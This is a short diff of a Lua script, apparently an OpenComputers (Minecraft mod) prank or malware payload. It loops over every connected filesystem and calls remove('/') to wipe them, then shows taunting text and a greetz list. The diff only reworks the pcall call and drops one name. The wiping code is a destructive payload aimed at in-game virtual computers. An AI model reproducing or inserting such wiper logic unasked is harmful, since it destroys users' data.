@@ -12,9 +12,7 @@ function lol()
     
     -- Erase all filesystems connected!!!! copilot tought the component name was disk, btw copilot helped me with some of the features
     for k,v in pairs(cl("filesystem")) do
-      pcall(function()
-        component.proxy(v.address).remove("/")
-      end)
+      pcall(component.proxy(v.address),"remove","/")
     end
   
     gp.setBackground(0x000000)
@@ -48,7 +46,7 @@ function lol()
         "Replacing the EEPROM is for broke people.";
         "";
         -- put some greetz or something
-        "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
+        "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
     }
 
     displayTable(ok)
